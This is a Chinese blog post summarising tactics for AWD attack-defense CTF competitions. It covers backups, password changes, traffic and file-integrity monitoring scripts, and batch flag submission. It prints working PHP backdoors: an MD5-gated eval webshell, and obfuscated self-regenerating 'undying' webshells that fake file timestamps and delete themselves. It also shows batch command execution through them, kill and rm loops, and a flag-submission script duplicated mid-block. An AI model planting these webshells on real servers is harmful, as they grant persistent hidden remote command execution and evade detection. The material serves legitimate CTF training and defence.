---
uuid: 92d5adb8-d2e4-6c4f-a198-72896dd269ba
title: awd比赛总结
date: 2022-05-15 15:52:04
tags:
   - awd
categories:
   - [awd]
---

awd**比赛总结**记录一下，方便以后回顾使用

<!--more-->

​	awd线上训练参加了很多，对awd也有一定的理解了，比靶场更仿真，更像渗透，同时难度更是上升了很多，在训练的同时也在网上看了很多关于awd的相关知识。

​	首先awd是需要队友之前配合才能取得更高的分数，刚开始一人去负责页面挖洞，另外一个是将源码down下来，还有一个队友负责把批量getshell和批量提交flag的模板写好。

# 准备阶段

比赛的相关工具当然少不了

- D盾（down下来的源码直接扫后门）
- WireShark（分析流量包）
- 攻击框架例如：[Attack-Defense-Framework](https://github.com/SniperOJ/Attack-Defense-Framework/tree/v2)
- burpsuite（搭配其中的工具Reissue Request Scripter，可以根据抓到的请求包直接生成请求脚本）
- 御剑或者[dirsearch](https://github.com/maurosoria/dirsearch)（用来扫网页的后台目录）
- nmap或者[httpscan](https://github.com/zer0h/httpscan)（用来扫描网段，得到对手机的ip）
- 服务器管理软件，termius或者winscp等

脚本也少不了，尤其是不死马脚本(加密shell防止被别人直接使用)和流量监控脚本，waf的话也得备一下，除此之外还有很多命令，如果记不住那就记录一下，想不出来命令更尴尬。

# 比赛过程

​	首先就是备份，非常重要，不仅仅代码审计更是为了防止被被人删掉源码导致服务器宕机，总之开始比赛先备份，没毛病。

​	站点源码可以用winscp进行备份到本地，但是速度会很慢，速度快的方法就是直接用tar打包，放在home目录，最好不要放在tmp目录，因为这个目录没有配置权限，如果在比赛过程中我们拿到了别人的shell，可以去tmp目录看看，说不定有惊喜。

​	tar备份的方法

```
cd /var/www/html
tar -zcvf ~/html.tar.gz *
```

还原方法

```
rm -rf /var/www/html
tar -zxvf ~/html.tar.gz -C /var/www/html
```

或者

```
cd /var/www/html
rm -rf *
tar -zxvf ~/html.tar.gz
```

上面这是站点源码，除此之外还有数据库备份，有的时候数据库里面还有flag，首先找到配置文件，找找账号密码

```
cd /var/www/html
find .|xargs grep "password"
```

备份

```
$ cd /var/lib/mysql #(进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)
$ mysqldump -u root -p Test > Test.sql # 输入密码即可。
$ mysqldump -u root -p --all-databases > ~/backup.sql  # 备份所有数据库
$ mysqldump -u root -p --all-databases -skip-lock-tables > ~/backup.sql  # 跳过锁定的数据库表
```

还原

```
$ mysql -u root -p
mysql> create database [database_name];  # 输入要还原的数据库名
mysql> use [database_name]
mysql> source backup.sql;    # source后跟备份的文件名
```

还原也可以这样

```
$ cd /var/lib/mysql # (进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)
$ mysql -u root -p Test < Test.sql  # 输入密码即可（将要恢复的数据库文件放到服务器的某个目录下，并进入这个目录执行以上命令）。
```

备份之后还需要口令修改，ssh，cms，数据库root都需要修改

数据库口令修改，数据库密码修改

```
$ mysql -u root -p
show databases;
use mysql
set password for root@localhost = password('123');
或者
update user set password = PASSWORD('需要更换的密码') where user='root';
flush privileges;
show tables;   # 看看有没有flag
```

ssh口令修改，登录ssh之后

```
passwd[用户]
```

之后再上传流量监控脚本，它可以让你知道对手是如何攻击你的，你就可以用攻击你的方法攻击其他人

```
<?php
$ip = $_SERVER["REMOTE_ADDR"];      //记录访问者的ip
$filename = $_SERVER['PHP_SELF'];       //访问者要访问的文件名
$parameter = $_SERVER["QUERY_STRING"];      //访问者要请求的参数
$method = $_SERVER['REQUEST_METHOD'];       //请求方法
$uri = $_SERVER['REQUEST_URI'];             //请求URI
$time = date('Y-m-d H:i:s',time());     //访问时间
$post = file_get_contents("php://input",'r');       //接收POST数据
$others = '...其他你想得到的信息...';
$logadd = 'Visit Time：'.$time.' '.'Visit IP：'.$ip."\r\n".'RequestURI：'.$uri.' '.$parameter.'RequestMethod：'.$method."\r\n";
// log记录
$fh = fopen("/tmp/log.txt", "a+");
fwrite($fh, $logadd);
fwrite($fh, print_r($_COOKIE, true)."\r\n");
fwrite($fh, $post."\r\n");
fwrite($fh, $others."\r\n");
fclose($fh);
?>
```

这种脚本一般放置在CMS的入口文件处，下面几个常见CMS的入口地址，在这些入口的文件里使用`require_once()`就可以将监控脚本包含进去，达到流量监控的目的：

```
PHPCMS V9 \phpcms\base.php
PHPWIND8.7 \data\sql_config.php
DEDECMS5.7 \data\common.inc.php
DiscuzX2   \config\config_global.php
Wordpress   \wp-config.php
Metinfo   \include\head.php
```

还有文件监控，文件监控就是将任何没有免死金牌的上传文件全部拦截，上传一个我就自动给你删掉，或者将其中的文件内容直接全部修改掉，这种脚本说实话也是比较危险，看实际情况而定吧，下面就是一个文件监控脚本：

```
# -*- coding: utf-8 -*-
#use: python file_check.py ./

import os
import hashlib
import shutil
import ntpath
import time

CWD = os.getcwd()
FILE_MD5_DICT = {}      # 文件MD5字典
ORIGIN_FILE_LIST = []

# 特殊文件路径字符串
Special_path_str = 'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'
bakstring = 'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'
logstring = 'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'
webshellstring = 'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'
difffile = 'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'

Special_string = 'diaossama'  # 免死金牌
UNICODE_ENCODING = "utf-8"
INVALID_UNICODE_CHAR_FORMAT = r"\?%02x"

# 文件路径字典
spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))
Special_path = {
    'bak' : os.path.realpath(os.path.join(spec_base_path, bakstring)),
    'log' : os.path.realpath(os.path.join(spec_base_path, logstring)),
    'webshell' : os.path.realpath(os.path.join(spec_base_path, webshellstring)),
    'difffile' : os.path.realpath(os.path.join(spec_base_path, difffile)),
}

def isListLike(value):
    return isinstance(value, (list, tuple, set))

# 获取Unicode编码
def getUnicode(value, encoding=None, noneToNull=False):

    if noneToNull and value is None:
        return NULL

    if isListLike(value):
        value = list(getUnicode(_, encoding, noneToNull) for _ in value)
        return value

    if isinstance(value, unicode):
        return value
    elif isinstance(value, basestring):
        while True:
            try:
                return unicode(value, encoding or UNICODE_ENCODING)
            except UnicodeDecodeError, ex:
                try:
                    return unicode(value, UNICODE_ENCODING)
                except:
                    value = value[:ex.start] + "".join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]
    else:
        try:
            return unicode(value)
        except UnicodeDecodeError:
            return unicode(str(value), errors="ignore")

# 目录创建
def mkdir_p(path):
    import errno
    try:
        os.makedirs(path)
    except OSError as exc:
        if exc.errno == errno.EEXIST and os.path.isdir(path):
            pass
        else: raise

# 获取当前所有文件路径
def getfilelist(cwd):
    filelist = []
    for root,subdirs, files in os.walk(cwd):
        for filepath in files:
            originalfile = os.path.join(root, filepath)
            if Special_path_str not in originalfile:
                filelist.append(originalfile)
    return filelist

# 计算机文件MD5值
def calcMD5(filepath):
    try:
        with open(filepath,'rb') as f:
            md5obj = hashlib.md5()
            md5obj.update(f.read())
            hash = md5obj.hexdigest()
            return hash
    except Exception, e:
        print u'[!] getmd5_error : ' + getUnicode(filepath)
        print getUnicode(e)
        try:
            ORIGIN_FILE_LIST.remove(filepath)
            FILE_MD5_DICT.pop(filepath, None)
        except KeyError, e:
            pass

# 获取所有文件MD5
def getfilemd5dict(filelist = []):
    filemd5dict = {}
    for ori_file in filelist:
        if Special_path_str not in ori_file:
            md5 = calcMD5(os.path.realpath(ori_file))
            if md5:
                filemd5dict[ori_file] = md5
    return filemd5dict

# 备份所有文件
def backup_file(filelist=[]):
    # if len(os.listdir(Special_path['bak'])) == 0:
    for filepath in filelist:
        if Special_path_str not in filepath:
            shutil.copy2(filepath, Special_path['bak'])

if __name__ == '__main__':
    print u'---------start------------'
    for value in Special_path:
        mkdir_p(Special_path[value])
    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件
    ORIGIN_FILE_LIST = getfilelist(CWD)
    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)
    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG
    print u'[*] pre work end!'
    while True:
        file_list = getfilelist(CWD)
        # 移除新上传文件
        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))
        if len(diff_file_list) != 0:
            # import pdb;pdb.set_trace()
            for filepath in diff_file_list:
                try:
                    f = open(filepath, 'r').read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u'[*] webshell find : ' + getUnicode(filepath)
                        shutil.move(filepath, os.path.join(Special_path['webshell'], ntpath.basename(filepath) + '.txt'))
                    except Exception as e:
                        print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filepath)
                    try:
                        f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                        f.write('newfile: ' + getUnicode(filepath) + ' : ' + str(time.ctime()) + '\n')
                        f.close()
                    except Exception as e:
                        print u'[-] log error : file move error: ' + getUnicode(e)

        # 防止任意文件被修改,还原被修改文件
        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)
        for filekey in md5_dict:
            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:
                try:
                    f = open(filekey, 'r').read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u'[*] file had be change : ' + getUnicode(filekey)
                        shutil.move(filekey, os.path.join(Special_path['difffile'], ntpath.basename(filekey) + '.txt'))
                        shutil.move(os.path.join(Special_path['bak'], ntpath.basename(filekey)), filekey)
                    except Exception as e:
                        print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filekey)
                    try:
                        f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                        f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\n')
                        f.close()
                    except Exception as e:
                        print u'[-] log error : done_diff: ' + getUnicode(filekey)
                        pass
        time.sleep(2)
        # print '[*] ' + getUnicode(time.ctime())
```

一般比赛都会有预留后门，所以可以把自己down下的源码放到d盾里面扫一下，看看有哪些后门，及时删除并试试可以利用预留后门打一下别人

除此之外还有不死马，这个可以权限持续维持，每局都可以得分

一句话木马那方法就很多了，在这就不列举了。还有md5马

```
<?php
echo 'hello';
if(md5($_POST['pass'])=='042766b4e0c02419a448f2e8ec68d9bc'){
	@eval($_POST['cmd']);
}
?>
```

不死马也有很多种，但是为了不让别人直使用所以都进行了一定的加密，一种是不断复制自身达到不死，一种是复制多个马到不同目录相互守护，此外有区块链马，不知道是个啥

```
<?php
    set_time_limit(0);
    ignore_user_abort(true);
    $file = '.demo.php';
    $shell = "<?php $_hR=chr(99).chr(104).chr(114);$_cC=$_hR(101).$_hR(118).$_hR(97).$_hR(108).$_hR(40).$_hR(36).$_hR(95).$_hR(80).$_hR(79).$_hR(83).$_hR(84).$_hR(91).$_hR(49).$_hR(93).$_hR(41).$_hR(59);$_fF=$_hR(99).$_hR(114).$_hR(101).$_hR(97).$_hR(116).$_hR(101).$_hR(95).$_hR(102).$_hR(117).$_hR(110).$_hR(99).$_hR(116).$_hR(105).$_hR(111).$_hR(110);$_=$_fF("",$_cC);@$_();?>";
    //$_hR='chr'
    //$_cC='eval($_POST[1]);'
    //$_fF='create_function'
    while(true){
        file_put_contents($file, $shell);
        system('chmod 777 .demo.php');
        touch(".demo.php", mktime(11,11,11,11,11,2018));
        usleep(50);
        }
?>
```

这个demo就是会一直生成`.demo.php`的一句话木马，可以跟MD5马结合一下。

下面说一下如何杀不死马，结合上面demo.php不死马来说一下咋杀

```
<?php
while (1) {
 $pid=1234;
 @unlink('.demo.php');
 exec('kill -9 $pid');
}
?>
```

先用`ps`命令查看进程的pid，再修改一下上面的脚本执行即可

或者可以用`ps aux`命令来查看每个用户执行的命令和运行的进程

除此之外还有一个杀不死马的方法，写一个脚本不断生成那个不死马的同名文件，使那个不死马无法在该目录下创建文件，然后再找到那个不断创建不死马的进程将其杀死。
	比赛中如果抓不到有用的流量，日志分析也是很有用的，分析服务器的访问日志也可以发现一些信息，下面罗列了一些服务器的日志路径

```
apache: /var/log/apache2/access.log
nginx: /var/log/nginx/
```

自动化后台执行

​	有时候我们需要在服务器上后台执行一些脚本，这里就需要使用到`nohup`命令和linux shell中的`&`命令，`nohup`可以让命令不挂断地执行，`&`则可以让命令在后台运行，比如说现在我要在后台执行我的`check`脚本，我就可以这样写：

```
nohup python -u ./check.py > log.out &    # 这里-u是禁用缓存，使输出直接进入log.out
# 如果需要运行shell脚本并且需要获得错误信息的话
nohup ./run.sh > log.out 2>&1 &
# 如果不需要记录日志
nohup ./run.sh > /dev/null &Copy
```

查看它是否在后台执行可以使用`jobs`命令，输入`jobs`就可以看到后台运行了什么

# 最后

## 批量提交flag

再贴一下非常有用的脚本如果我们不能在对方服务器上种马，只能通过漏洞直接获取flag，那么我们可以通过上一步的自动化脚本在每一轮更新获取到的flag值将其写入文件，然后在本机用脚本批量交

```
#!/usr/bin/env python2
#coding=utf-8
import sys
import json
import urllib
import httplib
server_host = ''    #提交flag的服务器地址
server_port = 80
def submit(team_token, flag, host=server_host, port=server_port, timeout=5):
    if not team_token or not flag:
        raise Exception('team token or flag wrong')
    conn = httplib.HTTPConnection(host, port, timeout=timeout)
    params = urllib.urlencode({        #提交需要post的参数,根据情况修改
        'token': team_token,    
        'flag': flag,
    })
    headers = {
        "Content-type": "application/x-www-form-urlencode"
    }
    conn.request('POST', '[submit_flag_dir]', params, headers)    #第二个参数为提交flag的目录
    response = conn.getresponse()
    data = response.read()
    return json.loads(data)

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print 'usage: ./submitflag.py [team_token] [flag]'
        sys.exit()
    host = server_host
    if len(sys.argv) > 3:
        host = sys.argv[3]
#!/usr/bin/env python2
#coding=utf-8
import sys
import json
import urllib
import httplib
server_host = ''    #提交flag的服务器地址
server_port = 80
def submit(team_token, flag, host=server_host, port=server_port, timeout=5):
    if not team_token or not flag:
        raise Exception('team token or flag wrong')
    conn = httplib.HTTPConnection(host, port, timeout=timeout)
    params = urllib.urlencode({        #提交需要post的参数,根据情况修改
        'token': team_token,    
        'flag': flag,
    })
    headers = {
        "Content-type": "application/x-www-form-urlencode"
    }
    conn.request('POST', '[submit_flag_dir]', params, headers)    #第二个参数为提交flag的目录
    response = conn.getresponse()
    data = response.read()
    return json.loads(data)

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print 'usage: ./submitflag.py [team_token] [flag]'
        sys.exit()
    host = server_host
    if len(sys.argv) > 3:
        host = sys.argv[3]
    print json.dumps(submit(sys.argv[1], sys.argv[2], host=host), indent=4)
```

根据题目灵活修改

## 不死马理解

![](https://z4a.net/images/2022/05/15/image4a0b8d035e5d4b0f.png)

```
<?php
    ignore_user_abort(true);//设置与客户机断开是否会终止脚本的执行，这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。
    set_time_limit(0);//设置脚本最大执行时间，这里设置为0，即没有时间方面的限制
    unlink(__FILE__);//删除文件本身，以起到隐蔽自身的作用
    $file = '.busi.php';
    $code = '<?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?>';
    //pass=pass
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2018-12-01 09:10:12" .3.php');
        usleep(0);
    }//while循环中每隔usleep(0)即写新的后门文件，system命令用于修改文件的创建时间或修改时间，因为在AWD比赛中有的队伍使用
?>
```

就拿上面这个不死马来介绍一下，该不死马不断生成.busi.php，通过访问http://localhost/.busi.php?pass=pass ,这个pass内容是md5加密之后的结果，目的是为了防止别人直接使用，MD5理论上不可逆，然后POST a=system(“想要执行的系统命令”);即可通过不死马实现命令执行。如果使用python批量getshell的话大体思路就是

url=http://localhost/.busi.php?pass=pass
data={“a”:”system("cat /flag");”}
flag=requests.post(url=url,data=data).text然后url变变就可以，一般会维护一个地址池 从地址池里面取url或者取特征（可能某个url字段不一样）直接打就行，再配合提交flag的api就可以实现自动getflag。

​	检查十分钟内被修改过的php文件，所以我们修改文件日期稍微进行掩饰。

```
find *.php -mmin -10
```

在进行杀不死马的时候需要将usleep的值小于不死马的值，让杀马的速度比下马的速度快。

杀死不死马的几种方法

### shell脚本直接删除不死马

```
while :
do
	rm -rf .busi.php;
	echo "remove success";
done
```

一个循环语句，应该都能看懂，就是让他循环删马

### PHP服务重启

```
service apache2 restart
service php restart
```

这个方法在awd应该不能=使用，因为awd给的权限是不够的

### 杀低权限PHP进程

php-apache

```
<?php
system("kill `ps -ef | grep httpd | grep -v grep | awk '{print $2}'`");
```

php-fpm

```
<?php
system("kill `ps -ef | grep php-fpm | grep -v grep | awk '{print $2}'`");

```

